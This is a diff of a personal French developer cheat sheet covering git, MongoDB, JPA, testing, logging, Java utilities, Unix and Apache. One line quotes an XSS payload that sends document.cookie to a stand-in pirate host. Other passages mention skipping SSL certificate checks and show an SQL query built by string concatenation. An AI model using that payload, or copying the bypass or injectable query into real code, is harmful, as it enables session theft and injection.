@@ -1,9 +1,6 @@
 (?=.*string)(?=.*plusieurs)(?=.*lignes)
 bugmemoclap : 
-
-Ouverture du texte de l'extrait en edition : trop grand
 Apres enregistrement du micro le projet n'etait pas chargé
-Caddie a supprimer
 Message non visibles quand upload fichier
 Barre de defilement quand on upload un fichier "Mise a jour du texte patientez"
 Il ne switche pas sur le nouveau projet quand on creeun projet
@@ -950,7 +947,7 @@ git diff compare mon workspacepasencoreadded avec le dernier commit
       git diff --name-only // affiche que les noms des fichiers differents
       git log -L 2,5 ou +3 :pathfichier.txt // genial: affiche entre la ligne 2 et la ligne 5 tout l'historique du bouzin
       Linktaggit:  le tag ne se push pas par defaut: pour le pusher faire git push origin <identifiant du tag>
-      git checkout pathfichiermodifieMaisPasAdded //undo retour annuler mes modifs 
+      git checkout pathfichiermodifieMaisPasAdded //undo retour recupere annuler mes modifs 
       git checkout <nom_du_tag> pour revenir à une ancienne version// ne marche pas si je veux remplacer mon working directory modifié par le dernier commit: dans ce cas faire git chekout -- pathAvecWildcardDesFichiersQueJaiModifieDansLeWorkSpaceMaisQueJeNaiPasAdded (undo) Linkcheckout
       git checkout -f <nom_du_tag> pour ignorer le message "The following untracked working tree files would be overwritten by checkout" ATTENTION d'avoir commité avant et d'etre sur que le warning ne parle que de fichiers dont je m'en fous. LINKcheckoutquandmeme  
       si j'ai l'erreur "Please commit your changes or stash them before you merge." quand je pull: soit je stash soit je LINKcheckoutquandmeme
@@ -984,7 +981,7 @@ git diff compare mon workspacepasencoreadded avec le dernier commit
         git pull URLouPathRepositoryDistantPeutEtreLocal si il veut pas et/ou met message refusing to merge unrelated histories mettre:--allow-unrelated-histories//recupere les derniers push des autres sur mon HEAD local // si il dit "not a git repository" il faut que je me place dans le projet git
                     si il dit "....be overwritten by merge" c'est que quelqun a poste sur le repo des choses qu'il n'aurait pas du. 2 solutions: 1)faire un git clone ailleurs du projet puis git rm fichiersquinauraientpasdusetrouverdanslerepo puis commit et push 2)aller sur le repo et les supprimer
         si j'ai l'erreur cannot stat permission denied au moment d'une manip
-                c'est a chause de windows. il ya un fichier locké par un autre programme. Tout fermer et recommencer
+                c'est a cause de windows. il ya un fichier locké par un autre programme. Tout fermer et recommencer
 		pour faire du mirroring automatiquement par un petit script:
 			unrepogitdistant---->monpc---->unautrerepogitdistant 
 					eval $(ssh-agent -s)
@@ -1308,7 +1305,7 @@ corriger quick fix: alt+enter
 voir la console du run: alt+4
 pour modifier un type de fichier source: en faire un source, un repertoire de tests etc... Ctrl+Shift+Alt+s, choisir à gauche le projet, à droite le repertoire et clique droit dessus 
 erreur error details probleme explication Ctrl+F1
-search trouver rechercher partout Ctrl+shift+f // si ne marche plus bien, supprimer arreter intellij, supprimer .idea et redemarrer
+search trouver rechercher partout Ctrl+shift+f // si ne marche plus bien, arreter intellij, supprimer .idea et redemarrer car il ne reindexe plus
 recherche trouver search partout: maj maj
 afficher toutes les erreurs problemes: pour les voir il faut faire un build
 parcourir atteindre erreurs problems F2/Maj+F2
@@ -1398,6 +1395,7 @@ payara :payaramicro : // executeur direct d'un microservice.
         --prebootcommandfile fichier LINKasadmdfirez//facultatif. Execute le fichier avant de demarrer le serveur. Attention tout ne peux pas marcher dedans puisque le serveur n'est pas encore demarré
         --postbootcommandfile fichier LINKasadmdfirez//facultatif. s'execute dès que le serveur a demarré
         --postdeploycommandfile fichier LINKasadmdfirez//facultatif s'execute après les deployements sont terminés.         
+	voir aussi les parametres -D a ajouter au demarrage
 executer de la configuration post demarrage: LINKasadmdfirez
             #Disable dynamic reloading of applications
             set configs.config.server-config.admin-service.das-config.dynamic-reload-enabled=false
@@ -1729,6 +1727,7 @@ changer la couleur native du fond:
   main/res/values/colors.xml
 si j'arrive pas à debugger debuger
     Settings>usb>tethering
+	aller sur chrome://inspect/#devices
 faire un lien pour composer numero: <a href="tel:2125551212">2125551212</a>
 Gradle sync failed: Plugin is too old, please update to a more recent version, or set ANDROID_DAILY_OVERRIDE environment variable to ... Consult IDE log for more details (Help | Show Log)
     file>projet settings > modifier version plugin gradle
@@ -2398,7 +2397,11 @@ erreurs codes http: LINKcodesHttp
 304: le serveur dit que le browser a deja toutes les infos dans son cache et pas besoin de renvoyer d'autres infos + code 200
 500: erreur interne du serveur
 503: Service unavailable
-502: Probleme entre un serveur proxy intermediaire et le serveur final: probleme de protocole ou config
+
+			requetes dessus: 
+				Filter: {toto:titi}
+				Project: {UnChampARamener:1} // ou 0 pour exclure
+				Sort: {UnChampAFiltrer:1} // ou -1 pour desc502: Probleme entre un serveur proxy intermediaire et le serveur final: probleme de protocole ou config
 PRG :
                     GET: ne modifie jamais l'état du systeme sauf des trucs comme le logs, ne fait que renvoyer data comme un select. always load pages using GET
                     PUT: ne fait que modifier update un data du système
@@ -2908,7 +2911,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                     request.getMethod() 
                     request.getRequestURI() // pour connaitre l'url la page appelante incluant le contextPath. Exemple: toto/saml-landing ou /saml-landing si contexte="" 
                     request.getPathInfo() // recuperer le nom du fichier "/bip.wav"
-                    request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost
+                    request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost voir LINKapachesetterHeaderUrlDuClientAuLieuDeUrlInterneDuServeur
                     request.getQueryString() // retourne l'url mais uniquement après "?"
                     request.getScheme() // renvoit http ou https... attention si existe reverse proxy ca renvoit pas celui du reverseproxy mais celui du serveurMOI.(je crois)
                     request.getServletPath() // pareil que getRequestURI() sans le contextPath?? pas vraiment on dirait qu'il prend le milieu du path! grrrr
@@ -2916,7 +2919,7 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                     ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
                     request.getProtocol() ... bof...)
           	recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
-                                Cookie[] cookies = request.getCookies();
+                                Cookie[] cookies = request.getCookies(); //Attention peut renvoyer null
                                   String cookieName = SAPCookie;
                                   String defaultValue = 1;
                                   for ( int i=0; i<cookies.length; i++) {
@@ -6111,7 +6114,7 @@ AILLEURS: injecter mes beans par constructeur
 
 	
 
-        spring et mongodb :
+        spring et mongodb:
                     une classe @Configuration doit contenir aussi l'annotation:
                                 @EnableMongoRepositories(basePackages="package.vers.le.repository.mongodb")
                                 
@@ -7632,7 +7635,7 @@ kafka : A_COMPLETER voir aussi https://github.com/akka/alpakka-kafka qui fait de
         producers ont 3modes d'ecrtutre (async: donees pas garanties reçues. commited to leader: confirmation reception par le partition leader. commited to leader & quorum: confirmation reception par leader + une autre partition)
 mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents dans le systeme de fichier que en blob dans la db. la db c'est pour les metadatas.)
         -toujours activer l'authentification (par user/password au moins) facultatif sur local pour test.
-        -il faut désactiver l'introspection javascript par sécurité(dans fichier de config mettre javascriptEnabled:false). LinkLKJDSFA
+        -il faut désactiver l'introspection javascript par sécurité(dans fichier de config mettre javascriptEnabled:false). la config est dans mongod.cfg on peut y voir ou sont les donnees de la base sur le disque LinkLKJDSFA
         -attention!!!! l'ordre des champs du json au niveau n-1 est important! au niveau n pas de probleme( par ex utiliser ordre alphabetique)
         -si je veux utiliser limit alors toujours utiliser sort avant limit dans une requete.
         -il faut faire un schema: installer https://studio3t.com/knowledge-base-articles/schema-explorer/
@@ -7691,10 +7694,18 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
             dezipper quelque part, mkdir c:/data/db(ou autre part...)
         pour démarrer mongodb serveur en local: 
             puis cmd ceci: 
-            pathVersLeBin/mongod.exe --dbpath="c:\mongodb-win32-x86_64-2008plus-ssl-4.0.9\data\db" // ca demare le serveur par defaut là: mongodb://127.0.0.1:27017/nombasededonnee?ssl=true&gssapiServiceName=mongodb (ssl=true etc si il est distant)
+            pathVersLeBin/mongod.exe --dbpath="c:\path/vers/repertoire/database/ongodb-win32-x86_64-2008plus-ssl-4.0.9/data/db" // ca demare le serveur par defaut là: mongodb://127.0.0.1:27017/nombasededonnee?ssl=true&gssapiServiceName=mongodb (ssl=true etc si il est distant)
 																	mongodb://username:password@localhost:27017/basemongo
         pour demarrer un client mongodb pour administrer la base et pour faire des requetes de test
-            ensuite executer mongo.exe: c'est un client pour faire les requetes (c'est du javascript la dedans) LinkLKJDSFA . On peut aussi utiliser un gui qui s'appelle Robo3T à installer.
+            executer mongo.exe: c'est un client pour faire les requetes (c'est du javascript la dedans) LinkLKJDSFA . On peut aussi utiliser un gui qui s'appelle Robo3T à installer.
+			possible executer petit script avec : compter nombre de documents total totaux dans une base:
+				mongo.exe --port=xxx --host=localhost --username=xxx password=xxx --authenticationDatabase=yyy nomDeLaBaseDeDonnee path/vers/fichier/javascript.js
+				et dans le javascript.js:
+					var collections=db.getCollectionNames();
+					var total=0
+					for var i=0;i<collections.length;i++)
+					{ total=total+db[collections[i]].count()}
+					print(total);
             ou bien mongo mongodb://mongodb0.example.com:28015/testdb?ssl=true // si il est distant
         aide help:
             db.help()            
@@ -7702,7 +7713,7 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
             db.stats()            
         rentrer dans une base. Si elle n'existe pas il la crée. Je crois que une fois dedans on peut creer des users dedans.
             use nomdelabase
-	vider une base de donnée
+	vider supprimer une base de donnée
 		Aller d'abord dans la base (use labase)
 		puis db.dropDatabase()
 	vider effacer l'interieur supprimer toutes les lignes d'une collection
@@ -7728,7 +7739,7 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
                 }
             )    
         pour modifier les droits d'un user sur les bases:
-            db.grantRolesToUser("NomDuUser",
+            db.grantRolesToUser("NomDuUser", 		// pour que ca marche il faut faire la commande
                 [
                     {role:"readWrite", db: "unebase1"},
                     {role:"readWrite", db: "unebase2"},                    
@@ -7754,7 +7765,7 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
         pour voir la liste des collections d'une base:
             show collections
         exemples de rechercher requetes. Une collection = une table relationelle
-                    db.uneCollection.find({queryNeRienMettrePourTrouverTout},{facultatifLesChampsARetourer}) 
+                    db.uneCollection.find({queryNeRienMettrePourTrouverTout},{facultatifLesChampsARetourerFiltrer}) 
 	requete : exemples:
 		    db.lacollection.find({"champTypeTableau.4":{$not:{$in:["x","y]}}},{champaretourner:true,champapasretourner:false}) //4 eme index du champttypeTableau not(negation) in
             var doc = db.uneCollection.findOne ou find(...)// trouver par id (du coup doc est une variable) // findOne retourne le 1er resultat
@@ -7766,8 +7777,8 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
             db.myNewCollection3.createIndex( { y: 1 } ) // ajoute un indexe dans la collection
 	mongodump sur windows:
 		E:\x\MongoDB\bin\mongodump.exe --port=27017 --host=localhost --username=superuser --password=xxxx --authenticationDatabase=admin --db=testGlobal --out ou --archive=E:/mongoout //out dans un repertoire, archive dans un compresse
-	mongorestore:
-		"path/mongorestore.exe" --username laurent --password laurent --authenticationDatabase attentionCPasLaBaseDeDonneeCestLeNomDeLaBaseDauthentificationQueJeCreeBesoinRetenirNomLINKjdjdjd --archive=cheminVersArchive ou repertoireFiniParSlashOuFichierArchiveCreeParMongoDump
+	mongorestore: // ne fait jamais d'upsert. Ignore seulement si l'id existe deja
+		"path/mongorestore.exe" --username laurent --password laurent --authenticationDatabase attentionCPasLaBaseDeDonneeCestLeNomDeLaBaseDauthentificationQueJeCreeBesoinRetenirNomLINKjdjdjd --archive=cheminVersArchive ou repertoireFiniParSlashOuFichierArchiveCreeParMongoDump --nsFrom NomdemabaseInitialeDansLarchiveAttentionSiFauxilIgnoreToutNsFromEtNsTo.* --nsTo NouveauNomQueJeVeuxQuiDoitOverriderNomInitial.*
 		exemple: 
 		"C:\Program Files\MongoDB\Server\4.2\bin\mongorestore.exe" --username laurent --password laurent --authenticationDatabase ariba --archive=C:\Users\B042EL\Documents\Capitalisation\ArchivageDiagrameClassesEtDoc\mongodump\mongoout2 
 
@@ -7776,6 +7787,9 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
                 MongoCredential credential = MongoCredential.createCredential(usr,"nomDeLaBaseDauthentificationLINKjdjdjd",password.toCharArray());
                 MongoClient mongoClient = new MongoClient(new ServerAddress("localhost",27017),credential,MongoCLientOptions.builder().build());
                 return mongoClient.getDatabase("dbName").getCollection("collectionName");
+		// pour faire une recherche requete:
+			MongoDatabase connection...
+			connection.getCollection("unnomdecollection).find() ou .find(eq("UniqueName","toto").first();
             pour transformer bson en json en java:
 		String input="{\"timestamp\":0934820948}";
 		org.bson.Document doc=org.bson.Document.parse(input);
@@ -7790,6 +7804,10 @@ mongo :mongodb : nosql : (il vaut mieux stocker les fichiers images documents da
 			output (JSON) = {"timestamp" : xxx}
 		outil tool : mongocompass : s'installe à part.
 			C:\Users\B042EL\Documents\installation\MongoDBCompass\mongodb-compass-1.20.5-win32-x64\MongoDBCompass.exe
+			requetes dessus: 
+				Filter: {toto:titi}
+				Project: {UnChampARamener:1} // ou 0 pour exclure
+				Sort: {UnChampAFiltrer:1} // ou -1 pour desc
 		                  
   DM 
    ^ 
@@ -8661,9 +8679,10 @@ JPA : Specification d'ORM. Implementé par hibernate, eclipselink...
             <description>EclipseLink EntityManager</description>                 // facultatif
             <exclude-unlisted-classes>false</exclude-unlisted-classes>
              <jta-data-source>java:app/MemOclapDataSource</jta-data-source> //LINKjta: mettre la valeur de @DataSourceDefinition(name="java:app/MemOclapDataSource" pour aller cherche un datasource deja defini applicativement
-             ou
+             ou/et
             <properties> // parametres envoyés au persistenceprovider. On peut définir la base de donnée ici mais je prefere LINKjta  
-                <property name="eclipselink.logging.level" value="FINE"/>
+                <property name="eclipselink.logging.level" value="FINE"/>				|_Marche bien et trace les logs dans systemOut en tout cas.
+		<property name="eclipselink.logging.file" value="outputeclipselink.log"></property>	|
                 <property name="javax.persistence.jdbc.driver" value="org.hsqldb.jdbc.JDBCDataSource"/><!-- com.mysql.jdbc.Driver -->
             <property name="javax.persistence.jdbc.url" value="jdbc:hsqldb:mem:test;DB_CLOSE_DELAY=-1;DATABASE_TO_UPPER=false;"/> <!-- jdbc:mysql://127.0.0.1:3306/moviecatalog -->
             <!-- <property name="javax.persistence.jdbc.user" value="root"/> -->
@@ -8714,8 +8733,11 @@ JPA : Specification d'ORM. Implementé par hibernate, eclipselink...
         Connection connection = em.unwrap(Connection.class);
      utilisation de entitymanager: JPQL (sql en string) 2.0 contient JPA_API(criterias) preferer criteria api si besoin validation requettes à la compilation et requetes à la synthaxe dynamique
                 JPQL :
-                      - List cat = entityManager.createQuery("SELECT cat FROM nomDeMonObjetJAVA cat LEFT JOIN FETCH cat.nomDeMonFieldJAVA WHERE toto.nomDunFieldJAVA like '%M%' AND cat.unFieldJava=:totocestmoi")
-                                .setParameter("totocestmoi",projectId).setFirstResult(0) ou .getResultList(); //overrite lazy default behaviour at runtime
+                      - 	query = entityManager.createQuery("SELECT cat FROM nomDeMonObjetJAVA cat LEFT JOIN FETCH cat.nomDeMonFieldJAVA WHERE toto.nomDunFieldJAVA like '%M%' AND cat.unFieldJava=:totocestmoi") // Attention toujours mettre les alias
+                                query.setParameter("totocestmoi",projectId) //overrite lazy default behaviour at runtime
+				query.setFirstResult(numeroDePage-1)*taillePage); |_facultatif: pourla pagination
+				query.setMaxResults(taillePage)		     |
+				query.getResultList();
                       - List<MonEntite> cat = entityManager.createQuery("SELECT cat FROM nomDeMonObjetJAVA cat LEFT JOIN FETCH cat.nomDeMonFieldJAVA WHERE cat.nomDunFieldJAVA=:id",MonEntite.class).getResultList(); //overrite lazy default behaviour at runtime
                       - String query = "select distinct(alo_project.id), alo_project.nam......from alo_usr alo_usr left join alo_usrcrea alo_usrcrea on alo_usr.usr_id=alo_usrcrea.usrcrea_idusr where alo_usrcrea.usrcrea_idusr is not null and alo_usr.usr_id='"+uid+"' order by alo_project.name";
                         return em.createNativeQuery(query,Project.class).getResultList(); // pour les selects natifs
@@ -15297,6 +15319,7 @@ condidentialite/authenticite/non-repudiation=integrite(non modifie sur reseau) H
                   cryptage AES avec generation de cle etc etc...
                       voir article http://java.sun.com/developer/technicalArticles/Security/AES/AES_v1.html                                                            
 si j'ai l'erreur: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target et ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: 
+	C'est pas compliqué: faut juste mettre dans le truststore le bon certificat pem de TOTO ou son certificat parent, et au demarrage de lappli charger ce truststore grace aux options -D pour que mon appli accepte la requete entrante de TOTO
             Pour bypasser ignorer le trust handshake ssl: ou bien installer le certificat dans le truststore
             	String accesspoint = "https://ipam.intra.renault.fr/interfaces/ws.php";
              // Les lignes suivantes permettent d'ignorer un certificat SSL errone.(ou pas voir ci dessous). SI je m'en fous de la securite:
@@ -15772,10 +15795,12 @@ test :les tests : Linktestdevopsç9349
 JUNIT : (pour les tests unitaires c mieux d'utiliser le plugin maven surefire)// parce que ça génère des fichiers xml de rapport de tests.voir aussi LINKcucumberldfj
 TDD :
     inutile pour tester l'UI, l'accès à des fichiers (à isoler dans methodes non testees)
-    1er test doit etre Degenerate test: tester la base de la base sans rien faire et avancer petits pas par petits pas aux suivants sans inclure les dépendances necessaires. Tout doit pouvoir etre mocké
-    Je ne peux dev code que pour faire passer un test
+    1er test doit etre Degenerate test: tester la base de la base sans rien faire dans code et avancer petits pas par petits pas aux suivants sans inclure les dépendances necessaires. Tout doit pouvoir etre mocké
+    Je ne peux dev code tant que j'ai pas un test qui echoue d'abord
+    Arreter d'ecrire le test dès qu'il echoue ou ne compile pas pour passer au code pour le que test soit OK.
     Je ne peux pas ecrire plus d'un test qui échoue
     Tant que j'ai des tests KO je ne peux pas ecrire d'autres devs en +
+    Derniere etape: clean (ce qu'on fait regulièrement)
 si j'ai l'erreur sur eclipse au lancement du test: tests: " Test type does not exist"
     aller dans Executer>Debugger ou quoi et essayer par là...
 Organiser son projet avec ses tests comme ca:
@@ -15920,7 +15945,7 @@ junit4 : junit 4 : Version 1.4:
                             assertEquals("0,001.00",Utility.replaceDotByCommaForNumbers("0,001.00"));
                     			} 
                     	 */
-                    	 @Test(expected = IllegalBalanceException.class) // verifier qu'un test retourne une exception LINKldlghjg
+                    	 @Test(expected = IllegalBalanceException.class) // verifier qu'un test throws retourne une exception LINKldlghjg
                           public void siJaiCetEtat_AlorsJeMattendsACa() throws IllegalBalanceException {
                               AccountRule accountRule= new CustomerAccountRule();
                               customerAccount.withdrawAndReportBalance(50.0,accountRule);
@@ -16119,8 +16144,8 @@ JMockit :(le top car permet de tester l'intestable)>Mockito>EasyMock>Jmock AFAIR
       @ExtendWith(MockitoExtension.class)  // si junit5 seulement
         public class UploadToServerServiceTest {
     		@InjectMocks // facultatif Mock peut marcher sans. Classe qui est testee dans laquelle on injectera les mocks
-    		private RealTimePathCoverageController realTimePathCoverageController = new RealTimePathCoverageController(); // equivalent de @Tested dans jmockit : c'est une classe a tester dans laquelle je peux injecter des mocs LINKpourquecamarcheFairemokito
-                                                                                ou =spy(new MockRealTimePathCoverageController()); // si on veut injecter niveau en dessous. Necessite le LINKlkfjjgjgjgozo. avec @InjectMocks en haut c'est top! on peut remplacer facilement par un mock et en plus injecter dedans ce quon veut comme autre @Mock
+    		private RealTimePathCoverageController realTimePathCoverageController = new RealTimePathCoverageController(); // equivalent de @Tested dans jmockit : c'est une classe a tester dans laquelle je peux injecter des mocks LINKpourquecamarcheFairemokito
+                                                                                ou =spy(new MockRealTimePathCoverageController()); //on peut utiliser ça direct sans annoter @Spy. Sous un @InjectMock si on veut injecter niveau en dessous de @l'InjectMock. Necessite le LINKlkfjjgjgjgozo. avec @InjectMocks en haut c'est top! on peut remplacer facilement par un mock et en plus injecter dedans ce quon veut comme autre @Mock
     		@Mock ou @Spy     //Mock par defaut n'execute rien et on peut changer son comportement. Spy par defaut execute tout et on peut ecouter
             private RestTemplate restTemplate; // (peut etre une classe ou une interface) mock qui sera injectée dans RealTimePathCoverageController.
     			@BeforeEach ou @Before // selon junit5 ou 4
@@ -17389,7 +17414,11 @@ logback : (mieux que LinkLogutils)
               <file>MyLog.log</file>
                   <layout class="ch.qos.logback.classic.PatternLayout">
                     <Pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</Pattern> ajouter %X{first} et %X{last} pour LINKslf4jMcd 
-                  </layout> 
+		  </layout> 
+		ou 
+      		    <encoder>
+                      <pattern>%d{dd/MM/yyyy HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
+                   </encoder>
 			<rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"> //rotation des fichiers de logs 
 			    <fileNamePattern>logs\logFile.%d{yyyy-MM-dd}.%i.html</fileNamePattern> <!-- daily rollover -->
 			    <timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP">
@@ -17402,7 +17431,7 @@ logback : (mieux que LinkLogutils)
                   <appender-ref ref="STDOUT" />
                   <appender-ref ref="FILE" />
               </root>
-              <logger name="com.hraccess.hraspace.strongpassword" level="DEBUG">
+              <logger name="com.hraccess.hraspace.strongpassword" level="DEBUG"> // pour externaliser des parametres de logback (car je ne peux pas externaliser tout le fichier) j'ai qu'a mettre ...>${un.param}<... et a l'execution je met -Dun.param=DEBUG
                <appender-ref ref="STDOUT" /> // facultatif: si je ne met rien il est dirigé vers root ci dessus
                </logger>
           </configuration>
@@ -20566,7 +20595,7 @@ private boolean contientCommentStart(String ligne) {
             				
             			}
 	     Pattern pattern1 = Pattern.compile("//\\D{2,3}\\d+[_]"); cherche "//sdf5646540_" ou "//DF54455_"
-	 Summary of regular-expression constructs
+	 Summary of regular-expression constructs regexp : expression regulieres
                             Construct 	Matches
                              
                             Characters
@@ -20634,7 +20663,7 @@ private boolean contientCommentStart(String ligne) {
                             \B 	A non-word boundary
                             \A 	The beginning of the input
                             \G 	The end of the previous match
-                            \Z 	The end of the input but for the final terminator marche pas pour les retours chariot 
+                            \Z 	The end of the input but for the final terminator marche pas pour les retours chariot. Pour remplacer tous les retours chariot: replaceAll("(\\r|\\n)","xx")
                             \z 	The end of the input
                              
                             Greedy quantifiers
@@ -22018,6 +22047,7 @@ pour verifier que tout est en Maj Majuscules pas minuscules:
                         	}
 
 pour supprimer tous les caractères non ascii(chelous):
+pour supprimer les caracteres trop chelous d'un string:
             String convertToASCII(String toTrim) throws Exception
             	{
             		CharsetEncoder e = Charset.forName("US-ASCII").newEncoder(); 
@@ -22025,6 +22055,8 @@ pour supprimer tous les caractères non ascii(chelous):
             		char[] a = toTrim.toCharArray();
             		for(int i =0; i<a.length; i++)
             		{
+				if(Character.getType(chars[i])<20) result.append(chars[i]);
+                       		if (Character.isLetter(string.charAt(i)))
             			if (e.canEncode(a[i]))
             			{
             				ret.append(a[i]);
@@ -22032,38 +22064,12 @@ pour supprimer tous les caractères non ascii(chelous):
             		}
             				return ret.toString();
             	}                        	
-pour supprimer les caracteres trop chelous d'un string:
-              premiere methode:
-              public String removeAllNonChar(String string) throws Exception 
-                      	{
-                      		StringBuffer ret = new StringBuffer();
-                      		for (int i =0; i<string.length(); i++)
-                      		{
-                      			if (Character.isLetter(string.charAt(i)))
-                      			{
-                      				ret.append(string.charAt(i));
-                      			}
-                      		}
-                      		return ret.toString();
-                      	}
-               deuxeme methode: 
-										/**
-										 * <strong>Objectif</strong> Supprimer les caractères que le parseur XML ne pourras pas supporter
-										 * @author Duverge Laurent
-										 * @since 16 juil. 08
-										 * @param String donnee a traitee: on supprime les char de type 15
-										 * @return Un string sans les caracteres mal supportes
-										 */
-										public static String removeCharType15(String data)
-										{
-											StringBuffer result=new StringBuffer();
-											char[] chars = data.toCharArray();
-											for (int i=0;i<chars.length;i++)
-											{
-												if(Character.getType(chars[i])!=15) result.append(chars[i]);
-											}
-											return result.toString();
-										}
+	remplacer les caractères chelous par des caracteres ascii:
+		public String deAccent(String str) {
+		    String nfdNormalizedString = Normalizer.normalize(str, Normalizer.Form.NFD); 
+		    Pattern pattern = Pattern.compile("\\p{InCombiningDiacriticalMarks}+");
+		    return pattern.matcher(nfdNormalizedString).replaceAll("");
+		}
 __________________
 pour detecter supprimer tous les caracteres non iso: 
    public boolean hasAccentuatedChar(String string) {
@@ -22709,6 +22715,11 @@ pour recuperer les bytes d'un fichier:
 			}
 			lire.close();
 pour recuperer le string d'un fichier lire contenu d'un fichier
+	Pour lire les lignes d'un fichier:
+	depuis java11:
+    		File contentFile = new File(pathFile);
+	        var filePath = contentFile.toPath();
+	        var content = Files.readString(filePath, Charset.forName(app.getProperty("ENCODING"))); 
         depuis java10 je crois:
                 new FileInputStream("path/fichier.txt").transferTo(System.out)
         java7 et plus:
@@ -22732,11 +22743,6 @@ pour recuperer le string d'un fichier lire contenu d'un fichier
         		reader.close(); 
         	return lByteOut.toString();
         	}
-Pour lire les lignes d'un fichier:
-depuis java11:
-    File contentFile = new File(pathFile);
-        var filePath = contentFile.toPath();
-        var content = Files.readString(filePath, Charset.forName(app.getProperty("ENCODING"))); 
 FileInputStream lire = new FileInputStream(fichier); // fichier est un File
 			BufferedReader reader = new BufferedReader(new InputStreamReader(lire));
 			NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode! // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage:-))
@@ -24142,7 +24148,8 @@ La commande utilisee pour creer les fichiers ISO sous unix est:
       fuser
   il existe la commande ldapsearch sous unix pour faire des requettes ldap
   apres avoir fait "dmt &" faire vmstat 2 pour garder la session (2 pour rafficher toutes les deux secondes)
-  vmstat: la consomation cpu se lit sous cpu et sous us + sy
+  vmstat: la consomation cpu se lit sous cpu et sous us + sy (performences)
+pour connaitre la temperature du processeur chauffe : tapper sensors
   & le et commercial sert à  lancer la thread en tache de fond sous unix
   quelle est ma version type de linux:
       cat /etc/*-release
@@ -24287,14 +24294,6 @@ si a l'execution d'un script sh j'ai ca: cannot execute binary file
 on peut voir les hosts sous /etc/hosts
 les droits utilisateurs sous /etc/hosts.allow
 env pour voir les variables d'environnement
-pour setter les variable d'environnement:
-  sur unbuntu si c une nouvelle variable: 
-    export MA_VAR = toto
-  si on edite une variable existante: 
-    MA_VAR=titi
-  mais ca ca ne marche que pour la session du moment. Pour que ca persiste il faut editer sous 
-  $HOME/.profile 
-    
 dans /usr/bin noramlement (on peut retrouver dans les variables d'environnement) on voit tous les programmes que le user peut utiliser (.exe) (les commandes)
 
 commande unix: ifconfig -a determine adresse ip(nonfixe) (equivalent windows = ipconfig)(adresse ipv4 donne une valeur qui bouge) //pour une valeur ipfixe: un appel à https://httpbin.org/ip = http://www.mon-ip.com/
@@ -25950,7 +25949,7 @@ Pour rediriger les requetes du port 8080 de apache vers jetty:
                             ProxyPass /shop/ ! (execution de haut en bas voir ligne en dessous) (ProxyPass est une commande de reverseproxy) // laisse /shop tel qu'il est.                          	
                           	ProxyPass / http://localNOMDUSERVEURhost:8080/    // c'est ca qui va rediriger toutes les requetes du domaine www.mondomainepourjetty.com vers le port 8080 de jetty (voir ligne du dessus sauf celles qui finissent par shop/) // peut etre utilisé pour supprimer des termes de l'URL. Toujours finir par un / dans les 2 arguments
                           	ProxyPassReverse  /unContextRootParExempleOuJusteSlash http://0.0.0.0:8080/unContextRootParExempleOuJusteSlash // ca je pense que c'est pour quand mon serveur s'envoie une requête à lui-même.(redirection par ex) ATTENTION à l'ordre LINKpppassorder: mettre les plus specifique en haut.
-                          	ProxyPreserveHost On
+                          	ProxyPreserveHost On // marche bien: pour que en interne dans mon serveur il dit que son propre URI est celui qui a été appelé par le client. pas celui de la conf interne avec un port forcé interne. LINKapachesetterHeaderUrlDuClientAuLieuDeUrlInterneDuServeur
                           	DocumentRoot /var/www/suivi.booster-france.com/           //bof pas sur d'avoir besoin de ca
           pour rediriger les requetes de façon conditionnelle: 
                   RewriteCond "%{REMOTE_HOST}"  "^host1"  [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
@@ -26308,7 +26307,16 @@ pour manipuler le css directement:
           sheetParent.removeChild(sheetToBeRemoved);
                 
 pour faire des frames sans utiliser le iframe:
+	en HTML
         <object data="fichier.html" type="text/html" />
+	en javascript:
+		 var graph = document.createElement('object');
+		    graph.width = "100%";
+		    graph.height = "1000px";
+		    graph.type = "text/html";
+        		graph.data = uneURL;
+    		    graph.id = "graphObject";
+    		graph.onload=function(){ ...} // non ne marche pas
 pour faire un .ico icone 
       faire un .bmp et le renommer en .ico
       ou bien mettre dans le head: 
@@ -26424,7 +26432,7 @@ mon propre dropdownlist datalist plus efficace encore: prend aussi le milieu
                                                                           event.target.focus();
                                                                              for (j=0; j<opt.length; j++)
                                                                             {
-                                                                              opt[j].style.display="none";           
